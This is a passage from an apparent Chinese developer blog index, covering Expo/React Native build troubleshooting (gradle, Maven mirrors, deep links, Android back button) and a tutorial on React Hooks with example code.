./gradlew clean\r// Step3. 重新构建\rgradlew assembleRelease 九、裸漏工作流打包apk后，github上传文件过大 由于打包后的android代码增加了一个.hprof和一个 BasePackageList.java 大文件，所以在上传到github的时候文件超大了，由于expo用expo eject退出到裸漏工作流的时候没有自动生成对.hprof和BasePackageList.java的限制新.gitignore文件，所以要手动自己添加进去。最省事就是去到Expo的github根目录拿现成的来用 https://github.com/expo/expo/blob/master/.gitignore\n十、gradlew clean yarn android 过程中，报Task :app:processDebugResources FAILED 等等错误。\n Step1. android 文件夹中 执行清理构建\n gradlew clean  Step2. 然后再返回项目根目录 执行\n yarn android 十一、Could not download groovy-all-2.4.15.jar  由于中国共产党邪教的原因\n * What went wrong:\rCould not determine the dependencies of task \u0026#39;:app:lintVitalRelease\u0026#39;.\r\u0026gt; Could not resolve all artifacts for configuration \u0026#39;:app:debugCompileClasspath\u0026#39;.\r\u0026gt; Could not download groovy-all-2.4.15.jar (org.codehaus.groovy:groovy-all:2.4.15)\r\u0026gt; Could not get resource \u0026#39;https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar\u0026#39;.\r\u0026gt; Could not GET \u0026#39;https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar\u0026#39;.\r\u0026gt; Remote host terminated the handshake  解决办法\n  Step1. android/build.gradle\n repositories {\r- google()\r- jcenter()\r//用阿里镜像替换\r+ maven { url \u0026#39;https://maven.aliyun.com/repository/google\u0026#39;}\r+ maven { url \u0026#39;https://maven.aliyun.com/repository/jcenter\u0026#39;}\r+ maven { url \u0026#39;http://maven.aliyun.com/nexus/content/groups/public\u0026#39;}\r}  Step2. 然后再打包apk\n gradlew assembleRelease 十二、深层链接 DeepLink + android backbutton 安卓返回键 例子  在 /android/app/src/main/AndroidManifest.xml 中配置 scheme 访问前缀\n \u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;myapp\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;com.notbrent.mofengfs\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;a08\u0026#34;/\u0026gt;\r\u0026lt;/intent-filter\u0026gt;  配置深层链接\n import * as Linking from \u0026#39;expo-linking\u0026#39;;\rexport default {\rprefixes: [\u0026#39;a08://\u0026#39;],\rconfig: {\rscreens: {\rRoot: {\rscreens: {\rTabOne: {\rscreens: {\rTabOneScreen: \u0026#39;one\u0026#39;,\r},\r},\rTabTwo: {\rscreens: {\rTabTwoScreen: \u0026#39;two\u0026#39;,\r},\r},\r},\r},\r// NotFound: \u0026#39;*\u0026#39;,\rList: {\rpath: \u0026#39;list/:id\u0026#39;,\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r},\rDetail: {\rpath: \u0026#39;detail/:id\u0026#39;,\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r}\r}\r},\r};  NavigationContainer 中调用深层链接\n \u0026lt;NavigationContainer\rlinking={LinkingConfiguration}\rtheme={colorScheme === \u0026#39;dark\u0026#39; ? DarkTheme : DefaultTheme}\u0026gt;\r\u0026lt;RootNavigator /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt;  android backbutton 不能返回上一页的解决办法\n每个非首页屏幕都要添加goBack代码\n import { BackHandler } from \u0026#39;react-native\u0026#39;;\rexport const listScreen = ({ navigation: { goBack } }) =\u0026gt; {\r// 返回上一屏 start\rfunction handleBackButtonClick() {\rgoBack();\rreturn true;\r}\ruseEffect(() =\u0026gt; {\rBackHandler.addEventListener(\u0026#39;hardwareBackPress\u0026#39;, handleBackButtonClick);\rreturn () =\u0026gt; {\rBackHandler.removeEventListener(\u0026#39;hardwareBackPress\u0026#39;, handleBackButtonClick);\r};\r}, []);\r// 返回上一屏 end\r...\r...  唤醒深层链接，执行例如：\n npx uri-scheme open a08://detail/123 --android 完整例子：https://github.com/mofengfs/DeepLink-BackHandler-Example\n十三、启动屏幕白闪解决 使用 react navigation v5和 eva 主题， 在 NavigationContainer 中配置深色主题即可\n Step1.\n import { NavigationContainer, DarkTheme, DefaultTheme } from \u0026#39;@react-navigation/native\u0026#39;; import * as eva from \u0026#39;@eva-design/eva\u0026#39;;  Step2.\n const navigationTheme = eva.dark ? DarkTheme : DefaultTheme;  Step3.\n \u0026lt;NavigationContainer theme={navigationTheme} linking={deepLinking}\u0026gt;\r\u0026lt;MainStack /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt; 十四、worker cmd 假死状态 有时候打印没有即时显示，可以尝试敲回车键\n十五、error: Android project not found. Are you sure this is a React Native project? 很可能是丢失了./android/app/src/main/AndroidManifest.xml文件\n十六、Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0  ./android/build.gradle\n - classpath(\u0026#34;com.android.tools.build:gradle:3.5.3\u0026#34;)\r+ classpath(\u0026#34;com.android.tools.build:gradle:3.5.4\u0026#34;) 十七、文件更新，标记 任意能持久保存数据的地方/方式都可以做版本标记，总之就是让程序自己知道哪些逻辑执行过了，哪些需要执行，执行完了做标记，不管啥迁移都是这么个流程\n通过拉去服务器返回的版本号与本地数据库保存的版本号做对比，判断是否应该执行文件的更新操作。\n注意：压缩文件必须是能够直接解压不带根文件夹名称，压缩的时候需要注意，操作如下： 全选添加到 www.zip 操作\n十八、UI方向 默认UI横向。 只要进入了项目，就可以随意更改方向了。\n有关如何控制应用程序方向的信息，请参见app.json中的方向键\n有效值：自响应default，纵向portrait，横向landscape\nApp.json中配置\n{\r\u0026#34;expo\u0026#34;: {\r\u0026#34;name\u0026#34;: \u0026#34;my-app\u0026#34;,\r\u0026#34;slug\u0026#34;: \u0026#34;my-app\u0026#34;,\r\u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;,\r- \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;,//纵向\r+ \u0026#34;orientation\u0026#34;: \u0026#34;default\u0026#34;,//自响应\r\u0026#34;icon\u0026#34;: \u0026#34;./assets/icon.png\u0026#34;,\r\u0026#34;splash\u0026#34;: {\r\u0026#34;image\u0026#34;: \u0026#34;./assets/splash.png\u0026#34;,\r\u0026#34;resizeMode\u0026#34;: \u0026#34;contain\u0026#34;,\r\u0026#34;backgroundColor\u0026#34;: \u0026#34;#ffffff\u0026#34;\r},\r\u0026#34;updates\u0026#34;: {\r\u0026#34;fallbackToCacheTimeout\u0026#34;: 0\r},\r\u0026#34;assetBundlePatterns\u0026#34;: [\r\u0026#34;**/*\u0026#34;\r],\r\u0026#34;ios\u0026#34;: {\r\u0026#34;supportsTablet\u0026#34;: true\r},\r\u0026#34;android\u0026#34;: {\r\u0026#34;adaptiveIcon\u0026#34;: {\r\u0026#34;foregroundImage\u0026#34;: \u0026#34;./assets/adaptive-icon.png\u0026#34;,\r\u0026#34;backgroundColor\u0026#34;: \u0026#34;#FFFFFF\u0026#34;\r}\r},\r\u0026#34;web\u0026#34;: {\r\u0026#34;favicon\u0026#34;: \u0026#34;./assets/favicon.png\u0026#34;\r}\r}\r} 十九、Expo\u0026amp;UI-Kitten（web端报错的问题） 解决办法：\n//1.安装\rexpo install @expo/webpack-config\r//2.根目录新建`webpack.config.js`添加\rconst createExpoWebpackConfigAsync = require(\u0026#39;@expo/webpack-config\u0026#39;);\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: [\u0026#39;@ui-kitten/components\u0026#39;]\r}\r}, argv);\rreturn config;\r}; 二十、Expo Web 项目抽屉   轮播图适合用的不多，react-native-banner-carousel 是其中一个\n  react-native-webview 不支持web端渲染html，替代方案是使用 react-native-web-webview\n  在线客服\n  function Link(props: any) {\rreturn (\r\u0026lt;Text\r{...props}\raccessibilityRole=\u0026#34;link\u0026#34;\rstyle={StyleSheet.compose(styles.link, props.style)}\r/\u0026gt;\r);\r}\r\u0026lt;Link href=\u0026#34;http://wpa.qq.com/msgrd?v=3\u0026amp;uin=QQ号\u0026amp;site=qq\u0026amp;menu=yes\u0026#34; style={styles.item}\u0026gt;\r\u0026lt;TouchableOpacity style={styles.link}\u0026gt;\r\u0026lt;FontAwesome5 name=\u0026#34;comments\u0026#34; size={24} color=\u0026#34;#1296db\u0026#34; /\u0026gt;\r\u0026lt;Text style={styles.item_text}\u0026gt;在线客服\u0026lt;/Text\u0026gt;\r\u0026lt;/TouchableOpacity\u0026gt;\r\u0026lt;/Link\u0026gt;  模态框使用 react-native-modalize\n  由于expo build:web 构建的是单页面应用，所以，在刷新页面的时候会找不到路由对应的文件，所以，最便捷的方式是通过npx serve \u0026ndash;single启动服务，通过云服务配置对应的端口号，比如配置5000， 那么npx serve \u0026ndash;single启动的服务也应该是5000， IIS配置的端口号随便了，只要不与5000或者其他端口冲突就行了。\n   除了5000端口号，还可通过以下命令自定义端口号(基于Vercel服务库)\n npx serve --single -l 1337\r//or\rnpx serve --single --listen 1337 ","description":"","id":39,"section":"react-native","tags":null,"title":"Expo 最佳实践","uri":"https://codthing.github.io/react-native/expo/expo-bp/"},{"content":"Hook 是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。\nHook 是一些可以让你在函数组件里“钩入” React state 及生命周期等特性的函数。\nHook 使你在无需修改组件结构的情况下复用状态逻辑。 这使得在组件间或社区内共享 Hook 变得更便捷。\nHook 将组件中相互关联的部分拆分成更小的函数（比如设置订阅或请求数据），而并非强制按照生命周期划分。你还可以使用 reducer 来管理组件的内部状态，使其更加可预测。\n什么时候我会用 Hook？ 如果你在编写函数组件并意识到需要向其添加一些 state，以前的做法是必须将其转化为 class。现在你可以在现有的函数组件中使用 Hook。\n一、Hooks 底层原理 React 是如何把对 Hook 的调用和组件联系起来的？\nReact 保持对当前渲染中的组件的追踪。多亏了 Hook 规范，我们得知 Hook 只会在 React 组件中被调用（或自定义 Hook —— 同样只会在 React 组件中被调用）。\n每个组件内部都有一个「记忆单元格」列表。它们只不过是我们用来存储一些数据的 JavaScript 对象。\n当你用 useState() 调用一个 Hook 的时候，它会读取当前的单元格（或在首次渲染时将其初始化），然后把指针移动到下一个。\n这就是多个 useState() 调用会得到各自独立的本地 state 的原因。\n二、Hooks 规范 1. 只在最顶层使用 Hook 不要在循环，条件或嵌套函数中调用 Hook ,确保总是在你的 React 函数的最顶层以及任何 return 之前调用他们。遵守这条规则，你就能确保 Hook 在每一次渲染中都按照同样的顺序被调用。 示例：\nfunction Form() {\r// 1. 使用`name state`变量\rconst [name, setName] = useState(\u0026#39;Mary\u0026#39;);\r// 2. 使用 `effect` 来持久化表单\ruseEffect(function persistForm() {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r});\r// 3. 使用 `surname` 状态变量\rconst [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;);\r// 4. 使用 `effect` 来更新标题\ruseEffect(function updateTitle() {\rdocument.title = name + \u0026#39; \u0026#39; + surname;\r});\r// ...\r} 那么 React 怎么知道哪个 state 对应哪个 useState？答案是 React 靠的是 Hook 调用的顺序。因为示例中，Hook 的调用顺序在每次渲染中都是相同的，所以它能够正常工作：\n// ------------\r// 首次渲染\r// ------------\ruseState(\u0026#39;Mary\u0026#39;) // 1. 使用 \u0026#39;Mary\u0026#39; 初始化变量名为 name 的 state\ruseEffect(persistForm) // 2. 添加 effect 以保存 form 操作\ruseState(\u0026#39;Poppins\u0026#39;) // 3. 使用 \u0026#39;Poppins\u0026#39; 初始化变量名为 surname 的 state\ruseEffect(updateTitle) // 4. 添加 effect 以更新标题\r// -------------\r// 二次渲染\r// -------------\ruseState(\u0026#39;Mary\u0026#39;) // 1. 读取变量名为 name 的 state（参数被忽略）\ruseEffect(persistForm) // 2. 替换保存 form 的 effect\ruseState(\u0026#39;Poppins\u0026#39;) // 3. 读取变量名为 surname 的 state（参数被忽略）\ruseEffect(updateTitle) // 4. 替换更新标题的 effect\r// ... 只要 Hook 的调用顺序在多次渲染之间保持一致，React 就能正确地将内部 state 和对应的 Hook 进行关联。\n如果将一个 Hook 调用放到一个条件语句中会发生什么呢？ (例如 persistForm effect)\n// 🔴 在条件语句中使用 Hook 违反第一条规则\rif (name !== \u0026#39;\u0026#39;) {\ruseEffect(function persistForm() {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r});\r} 在第一次渲染中 name !== \u0026rsquo;\u0026rsquo; 这个条件值为 true，所以我们会执行这个 Hook。但是下一次渲染时我们可能清空了表单，表达式值变为 false。此时的渲染会跳过该 Hook，Hook 的调用顺序发生了改变：\nuseState(\u0026#39;Mary\u0026#39;) // 1. 读取变量名为 name 的 state（参数被忽略）\r// useEffect(persistForm) // 🔴 此 Hook 被忽略！\ruseState(\u0026#39;Poppins\u0026#39;) // 🔴 2 （之前为 3）。读取变量名为 surname 的 state 失败\ruseEffect(updateTitle) // 🔴 3 （之前为 4）。替换更新标题的 effect 失败 React 不知道第二个 useState 的 Hook 应该返回什么。React 会以为在该组件中第二个 Hook 的调用像上次的渲染一样，对应的是 persistForm 的 effect，但并非如此。从这里开始，后面的 Hook 调用都被提前执行，导致 bug 的产生。\n这就是为什么 Hook 需要在我们组件的最顶层调用。如果我们想要有条件地执行一个 effect，可以将判断放到 Hook 的内部： useEffect(function persistForm() {\r// 👍 将条件判断放置在 effect 中\rif (name !== \u0026#39;\u0026#39;) {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r}\r}); 2. 只在 React 函数中调用 Hook 不要在普通的 JavaScript 函数中调用 Hook。你可以：\n✅ 在 React 的函数组件中调用 Hook\n✅ 在自定义 Hook 中调用其他 Hook (我们将会在下一页 中学习这个。)\n遵循此规则，确保组件的状态逻辑在代码中清晰可见。\n三、自定义 Hook 自定义 Hook 是一种自然遵循 Hook 设计的约定，而并不是 React 的特性。\n自定义 Hook 是一种重用状态逻辑的机制(例如设置为订阅并存储当前值)，所以每次使用自定义 Hook 时，其中的所有 state 和副作用都是完全隔离的。\n通过自定义 Hook，可以将组件逻辑提取到可重用的函数中。\n这是一个聊天程序中的组件FriendListItem ，该组件用于显示好友的在线状态：\nimport React, { useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction FriendListItem(props) {\r----------------------------------------------------\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\r};\r});\r----------------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? \u0026#39;green\u0026#39; : \u0026#39;black\u0026#39; }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r} 1. 提取自定义 Hook 当想在两个函数之间共享逻辑时，把它提取到第三个函数中。而组件和 Hook 都是函数，所以也同样适用这种方式。\n自定义 Hook 是一个函数，其名称以 use 开头，函数内部可以调用其他的 Hook。\n例如，下面的 useFriendStatus 是一个自定义的 Hook:\nimport { useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(friendID, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange);\r};\r});\rreturn isOnline;\r} 此处并未包含任何新的内容——逻辑是从上述组件拷贝来的（记得去掉props）。与组件中一致，请确保只在自定义 Hook 的顶层无条件地调用其他 Hook。\n2. 使用自定义 Hook 把这个逻辑提取到 FriendListItem 的自定义 Hook 中，然后就可以使用它了：\nfunction FriendListItem(props) {\r------------------------------------------\rconst isOnline = useFriendStatus(props.friend.id);\r------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? \u0026#39;green\u0026#39; : \u0026#39;black\u0026#39; }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r} 3. 在多个 Hook 之间传递信息 由于 Hook 本身就是函数，因此可以在它们之间传递信息。\n这是一个聊天消息接收者的选择器，它会显示当前选定的好友是否在线:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  const friendList = [ { id: 1, name: \u0026#39;Phoebe\u0026#39; }, { id: 2, name: \u0026#39;Rachel\u0026#39; }, { id: 3, name: \u0026#39;Ross\u0026#39; }, ]; function ChatRecipientPicker() { --------------------------------------------------------- //当前选择的好友 ID 保存在 recipientID 状态变量中，并在用户从 \u0026lt;select\u0026gt; 中选择其他好友时更新这个 state。  const [recipientID, setRecipientID] = useState(1); //由于 useState 为我们提供了 recipientID 状态变量的最新值， //因此我们可以将它作为参数传递给自定义的 useFriendStatus Hook：  const isRecipientOnline = useFriendStatus(recipientID); --------------------------------------------------------- return ( \u0026lt;\u0026gt; --------------------------------------------------------- //当我们选择不同的好友并更新 recipientID 状态变量时， //useFriendStatus Hook 将会取消订阅之前选中的好友，并订阅新选中的好友状态。  \u0026lt;Circle color={isRecipientOnline ? \u0026#39;green\u0026#39; : \u0026#39;red\u0026#39;} /\u0026gt; --------------------------------------------------------- \u0026lt;select value={recipientID} onChange={e =\u0026gt; setRecipientID(Number(e.target.value))} \u0026gt; {friendList.map(friend =\u0026gt; ( \u0026lt;option key={friend.id} value={friend.id}\u0026gt; {friend.name} \u0026lt;/option\u0026gt; ))} \u0026lt;/select\u0026gt; \u0026lt;/\u0026gt; ); }   4. 自定义Hooks中使用useReducer 自定义 Hook 解决了以前在 React 组件中无法灵活共享逻辑的问题。更重要的是，创建自定义 Hook 就像使用 React 内置的功能一样简单。\n尽量避免过早地增加抽象逻辑。既然函数组件能够做的更多，那么代码库中函数组件的代码行数可能会剧增。\n这属于正常现象 —— 不必立即将它们拆分为 Hook。但我们仍鼓励你能通过自定义 Hook 寻找可能，以达到简化代码逻辑，解决组件杂乱无章的目的。\n例如，有个复杂的组件，其中包含了大量以特殊的方式来管理的内部状态。useState 并不会使得集中更新逻辑变得容易，因此你可能更愿意使用 redux 中的 reducer 来编写。\n那么，为什么我们不编写一个 useReducer 的 Hook，使用 reducer 的方式来管理组件的内部 state 呢？其简化版本可能如下所示：\nfunction useReducer(reducer, initialState) {\rconst [state, setState] = useState(initialState);\rfunction dispatch(action) {\rconst nextState = reducer(state, action);\rsetState(nextState);\r}\rreturn [state, dispatch];\r} 在组件中使用它，让 reducer 驱动它管理 state：\nfunction Todos() {\rconst [todos, dispatch] = useReducer(todosReducer, []);\rfunction handleAddClick(text) {\rdispatch({ type: \u0026#39;add\u0026#39;, text });\r}\r// ...\r} 5. 异步 fetch Hooks 处理异步调用，应该包含以下内容：\n 创建一个接受处理函数的自定义钩子，fn. 为自定义hooks的状态定义一个 reducer 函数和一个初始状态。 使用useReducer()钩子初始化state变量和dispatch函数。 定义一个异步 run 函数，该函数将运行提供的回调 fn，同时根据需要使用 dispatch 更新 state。 返回一个包含state( value,error和loading) 和run函数的对象。  1). 封装 useAsync  ./customHooks/useAsync.ts  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import React, { useReducer } from \u0026#39;react\u0026#39; export const useAsync = fn =\u0026gt; { //创建一个接受处理函数的自定义钩子，`fn`.  const initialState = { loading: false, error: null, value: null }; //初始化状态  const stateReducer = (_, action) =\u0026gt; {//处理状态的逻辑  switch (action.type) { case \u0026#39;start\u0026#39;: return { loading: true, error: null, value: null }; case \u0026#39;finish\u0026#39;: return { loading: false, error: null, value: action.value }; case \u0026#39;error\u0026#39;: return { loading: false, error: action.error, value: null }; } }; const [state, dispatch] = useReducer(stateReducer, initialState);//使用`useReducer()`钩子初始化`state`变量和`dispatch`函数  const run = async (args = null) =\u0026gt; {//定义一个异步 `run` 函数，该函数将运行提供的`回调 fn`，同时根据需要使用 `dispatch` 更新 `state`  try { dispatch({ type: \u0026#39;start\u0026#39; }); const value = await fn(args); dispatch({ type: \u0026#39;finish\u0026#39;, value }); } catch (error) { dispatch({ type: \u0026#39;error\u0026#39;, error }); } }; return { ...state, run };//返回一个包含`state`( `value`,`error`和`loading`) 和`run`函数的对象。 };   2). 在组件中使用  component  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import { useAsync } from \u0026#39;./customHooks/useAsync\u0026#39;; const RandomImage = props =\u0026gt; { const imgFetch = useAsync(url =\u0026gt; fetch(url).then(response =\u0026gt; response.json()) ); return ( \u0026lt;div\u0026gt; \u0026lt;button onClick={() =\u0026gt; imgFetch.run(\u0026#39;https://dog.ceo/api/breeds/image/random\u0026#39;)} disabled={imgFetch.isLoading} \u0026gt; Load image \u0026lt;/button\u0026gt; \u0026lt;br /\u0026gt; {imgFetch.loading \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;} {imgFetch.error \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Error {imgFetch.error}\u0026lt;/div\u0026gt;} {imgFetch.value \u0026amp;\u0026amp; ( \u0026lt;img src={imgFetch.value.message} alt=\u0026#34;avatar\u0026#34; width={400} height=\u0026#34;auto\u0026#34; /\u0026gt; )} \u0026lt;/div\u0026gt; ); }; // ReactDOM.render(\u0026lt;RandomImage /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;));   四、ESLint 插件 React发布了一个名为 eslint-plugin-react-hooks 的 ESLint 插件来强制执行Hooks规则。\n如果项目中没有自动安装，可自行安装配置：\nyarn add --dev eslint-plugin-react-hooks // 你的 ESLint 配置\r{\r\u0026#34;plugins\u0026#34;: [\r// ...\r\u0026#34;react-hooks\u0026#34;\r],\r\u0026#34;rules\u0026#34;: {\r// ...\r\u0026#34;react-hooks/rules-of-hooks\u0026#34;: \u0026#34;error\u0026#34;, // 检查 Hook 的规则\r\u0026#34;react-hooks/exhaustive-deps\u0026#34;: \u0026#34;warn\u0026#34; // 检查 effect 的依赖\r}\r} 五、Hooks API 1. useState 返回一个 state，以及更新 state 的函数。\nconst [state, setState] = useState(initialState); 等号左边名字并不是 React API 的部分，你可以自己取名字。\n在初始渲染期间，返回的状态 (state) 与传入的第一个参数 (initialState) 值相同。\n这种 JavaScript 语法叫数组解构。等价于\nvar fruitStateVariable = useState(\u0026#39;banana\u0026#39;); // 返回一个有两个元素的数组\rvar fruit = fruitStateVariable[0]; // 数组里的第一个值\rvar setFruit = fruitStateVariable[1]; // 数组里的第二个值 1). 普通式更新state 在后续的重新渲染中，useState 返回的第一个值将始终是更新后最新的 state。\nsetState(newState); 2). 函数式更新state 如果新的state需要通过使用先前的state计算得出，那么可以将函数传递给 setState。该函数将接收先前的 state，并返回一个更新后的值。\nfunction Counter({initialCount}) {\rconst [count, setCount] = useState(initialCount);\rreturn (\r\u0026lt;\u0026gt;\rCount: {count}\r\u0026lt;button onClick={() =\u0026gt; setCount(initialCount)}\u0026gt;Reset\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount - 1)}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount + 1)}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} + 和 - 按钮采用函数式形式，因为被更新的 state 需要基于之前的 state。但是重置按钮则采用普通形式，因为它总是把 count 设置回初始值。\n如果你的更新函数返回值与当前 state 完全相同，则随后的重渲染会被完全跳过。\n3). 合并更新对象 与 class 组件中的 setState 方法不同，useState 不会自动合并更新对象。可以用函数式的 setState 结合展开运算符来达到合并更新对象的效果。\nconst [state, setState] = useState({});\rsetState(prevState =\u0026gt; {\r// 也可以使用 Object.assign\rreturn {...prevState, ...updatedValues};\r}); useReducer 是另一种可选方案，它更适合用于管理包含多个子值的 state 对象。\n4). 惰性初始 state initialState 参数只会在组件的初始渲染中起作用，后续渲染时会被忽略。\n如果初始 state 需要通过复杂计算获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用：\nconst [state, setState] = useState(() =\u0026gt; {\rconst initialState = someExpensiveComputation(props);\rreturn initialState;\r}); 5). 跳过 state 更新 调用 State Hook 的更新函数setState并传入当前的 state 时，React 将跳过子组件的渲染及 effect 的执行。（React 使用Object.is比较算法来比较 state。）\n需要注意的是，React 可能仍需要在跳过渲染前渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。\n如果在渲染期间执行了高开销的计算，则可以使用 useMemo 来进行优化。\n2. useEffect Effect Hook 可以让你在函数组件中执行副作用操作(改变 DOM、添加订阅、设置定时器、记录日志等)\n赋值给 useEffect 的函数会在组件渲染到屏幕之后执行。\n可以把 effect 看作从 React 的纯函数式世界通往命令式世界的逃生通道。\n默认情况下，effect 将在每轮渲染结束后执行，但你可以选择让它 在只有某些值改变的时候 才执行。\nuseEffect(didUpdate); 1). 清除 effect 通常，组件卸载时需要清除 effect 创建的诸如订阅或计时器 ID 等资源。\n要实现这一点，useEffect 函数需返回一个清除函数。以下就是一个创建订阅的例子：\nuseEffect(() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\r// 清除订阅\rsubscription.unsubscribe();\r};\r}); 为防止内存泄漏，清除函数会在组件卸载前执行。\n另外，如果组件多次渲染（通常如此），则在执行下一个 effect 之前，上一个 effect 就已被清除。\n2). effect 的执行时机 与 componentDidMount、componentDidUpdate 不同的是，传给 useEffect 的函数会在浏览器完成布局与绘制之后，在一个延迟事件中被调用。\n这使得它适用于许多常见的副作用场景，比如设置订阅和事件处理等情况，因为绝大多数操作不应阻塞浏览器对屏幕的更新。\n虽然 useEffect 会在浏览器绘制后延迟执行，但会保证在任何新的渲染前执行。\n在开始新的更新前，React 总会先清除上一轮渲染的 effect。\n3). useLayoutEffect 然而，并非所有 effect 都可以被延迟执行。例如，一个对用户可见的 DOM 变更就必须在浏览器执行下一次绘制前被同步执行，这样用户才不会感觉到视觉上的不一致。（概念上类似于被动监听事件和主动监听事件的区别。）React 为此提供了一个额外的 useLayoutEffect Hook 来处理这类 effect。它和 useEffect 的结构相同，区别只是调用时机不同。\n它会在所有的 DOM 变更之后同步调用 effect。可以使用它来读取 DOM 布局并同步触发重渲染。在浏览器执行绘制之前，useLayoutEffect 内部的更新计划将被同步刷新。\n尽可能使用标准的 useEffect 以避免阻塞视觉更新。\n如果你正在将代码从 class 组件迁移到使用 Hook 的函数组件，则需要注意 useLayoutEffect 与 componentDidMount、componentDidUpdate 的调用阶段是一样的。\n但是，我们推荐你一开始先用 useEffect，只有当它出问题的时候再尝试使用 useLayoutEffect。\n4). SSR 服务器端渲染 如果你使用服务端渲染，请记住，无论 useLayoutEffect 还是 useEffect 都无法在 Javascript 代码加载完成之前执行。\n这就是为什么在服务端渲染组件中引入 useLayoutEffect 代码时会触发 React 告警。\n解决这个问题，需要将代码逻辑移至 useEffect 中（如果首次渲染不需要这段逻辑的情况下），或是将该组件延迟到客户端渲染完成后再显示（如果直到 useLayoutEffect 执行之前 HTML 都显示错乱的情况下）。\n若要从服务端渲染的 HTML 中排除依赖布局 effect 的组件，可以通过使用 showChild \u0026amp;\u0026amp; \u0026lt;Child /\u0026gt; 进行条件渲染，并使用 useEffect(() =\u0026gt; { setShowChild(true); }, []) 延迟展示组件。\n这样，在客户端渲染完成之前，UI 就不会像之前那样显示错乱了。\n5). effect 的条件执行1 默认情况下，effect 会在每轮组件渲染完成后执行。这样的话，一旦 effect 的依赖发生变化，它就会被重新创建。\n然而，在某些场景下这么做可能会矫枉过正。比如，在上一章节的订阅示例中，我们不需要在每次组件更新时都创建新的订阅，而是仅需要在 source prop 改变时重新创建。\n要实现这一点，可以给 useEffect 传递第二个参数，它是 effect 所依赖的值数组。\n更新后的示例如下：(此时，只有当 props.source 改变后才会重新创建订阅。)\nuseEffect(\r() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\rsubscription.unsubscribe();\r};\r},\r[props.source],\r); 5). effect 的条件执行2 如果你要使用此优化方式，请确保数组中包含了所有外部作用域中会发生变化且在 effect 中使用的变量，否则你的代码会引用到先前渲染中的旧变量。\n如果想执行只运行一次的 effect（仅在组件挂载和卸载时执行），可以传递一个空数组（[]）作为第二个参数。\n这就告诉 React 你的 effect 不依赖于 props 或 state 中的任何值，所以它永远都不需要重复执行。这并不属于特殊情况 —— 它依然遵循输入数组的工作方式。\n如果你传入了一个空数组（[]），effect 内部的 props 和 state 就会一直持有其初始值。\n尽管传入 [] 作为第二个参数有点类似于 componentDidMount 和 componentWillUnmount 的思维模式，但它是更好的方式来避免过于频繁的重复调用 effect。\n除此之外，请记得 React 会等待浏览器完成画面渲染之后才会延迟调用 useEffect，因此会使得处理额外操作很方便。\nReact推荐启用 eslint-plugin-react-hooks 中的 exhaustive-deps 规则。此规则会在添加错误依赖时发出警告并给出修复建议。\n依赖项数组不会作为参数传给 effect 函数。虽然从概念上来说它表现为：所有 effect 函数中引用的值都应该出现在依赖项数组中。未来编译器会更加智能，届时自动创建数组将成为可能。\n3. useContext 我个人绝得，useContext 只适合用来做UI主题的传递 const value = useContext(MyContext); 接收一个 context 对象（React.createContext 的返回值）并返回该 context 